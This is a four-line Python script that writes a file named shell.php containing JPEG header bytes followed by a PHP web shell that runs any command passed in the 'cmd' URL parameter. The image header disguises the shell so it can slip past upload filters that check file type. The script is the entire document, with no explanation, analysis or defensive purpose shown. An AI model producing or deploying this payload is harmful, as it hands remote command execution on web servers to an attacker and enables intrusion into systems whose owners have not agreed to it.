if __name__ == '__main__':
	fp = open("shell.php", "w");
	fp.write('\xFF\xD8\xFF\xE0' + '<? passthru($_GET["cmd"]); ?>')
	fp.close();